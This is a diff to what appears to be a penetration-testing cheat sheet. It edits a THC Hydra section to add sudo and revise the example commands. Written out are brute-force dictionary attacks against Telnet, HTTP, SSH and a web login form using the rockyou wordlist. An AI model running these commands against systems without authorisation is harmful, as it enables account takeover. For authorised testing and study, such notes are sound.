@@ -3402,21 +3402,21 @@ Examples of usage:
 
 #### THC Hydra
 
-- `hydra`
-- `hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
+- `sudo hydra`
+- `sudo hydra -L users.txt -P pass.txt <service://server> <options>` launch a dictionary attack
   - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
   - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
   - Specify a port with `-s <PORT>` in <options>
 
 SSH Attack
-- `hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
+- `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
   - `-l` specify the target username
   - `-P` specify a wordlist
   - `protocol://IP` o specify the target protocol and IP address respectively
 
 HTTP POST Attack
-- `hydra http-form-post -U`
-- `hydra <IP> http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+- `sudo hydra http-form-post -U`
+- `sudo hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
   - `-l` user name
   - `-P` wordlist
   - `-vV` verbose output
